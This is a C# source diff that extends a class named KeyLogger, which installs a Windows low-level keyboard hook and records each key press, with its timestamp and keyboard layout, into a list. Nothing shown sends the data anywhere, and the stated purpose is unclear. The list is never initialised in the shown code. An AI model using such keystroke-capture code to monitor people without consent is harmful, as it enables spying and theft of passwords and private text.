@@ -1,7 +1,9 @@
 ﻿using System;
 using System.ComponentModel;
+using System.Collections.Generic;
 using System.Threading.Tasks;
 using System.Reflection;
+using System.Text;
 using System.Runtime.InteropServices;
 using System.Windows.Input;
 using System.Windows.Forms;
@@ -50,7 +52,11 @@ namespace UPClient
     /// </summary>
     public class KeyLogger
     {
-
+        List<KeyEntry> keyData;
+        /// <summary>
+        /// The keyboard type string for keyentries.
+        /// </summary>
+        String KeyboardType;
         /// <summary>
         /// The KBDLLHOOKSTRUCT structure contains information about a low-level keyboard input event. 
         /// </summary>
@@ -270,7 +276,17 @@ namespace UPClient
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
         private static extern short GetKeyState(int vKey);
-
+        /// <summary>
+        /// The GetKeyboardLayoutName function retrieves the keyboard's layout name.
+        /// </summary>
+        /// <param name="pwszKLID">
+        /// String builder that contains the name after the function runs.
+        /// </param>
+        /// <returns>
+        /// 
+        /// </returns>
+        [DllImport("user32.dll")]
+        private static extern long GetKeyboardLayoutName(System.Text.StringBuilder pwszKLID);
         #endregion
 
         #region Windows constants
@@ -336,7 +352,6 @@ namespace UPClient
         /// </remarks>
         public KeyLogger()
         {
-            Start();
         }
 
         /// <summary>
@@ -405,6 +420,14 @@ namespace UPClient
                     //Initializes and throws a new instance of the Win32Exception class with the specified error. 
                     throw new Win32Exception(errorCode);
                 }
+                //Retrieve keyboard type.
+                StringBuilder name = new StringBuilder();
+                GetKeyboardLayoutName(name);
+                KeyboardType = name.ToString();
+
+                KeyPress += KeyPressLog;
+                KeyUp += KeyUpLog;
+                KeyDown += KeyDownLog;
             }
         }
 
@@ -533,6 +556,18 @@ namespace UPClient
                 return 1;
             else
                 return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
+        }
+        private void KeyUpLog(object sender, KeyEventArgs e)
+        {
+
+        }
+        private void KeyPressLog(object sender, KeyboardHookArgs e)
+        {
+            keyData.Add(new KeyEntry((byte)e.vkCode,e.time,KeyboardType));
+        }
+        private void KeyDownLog(object sender, KeyEventArgs e)
+        {
+
         }
     }
 }
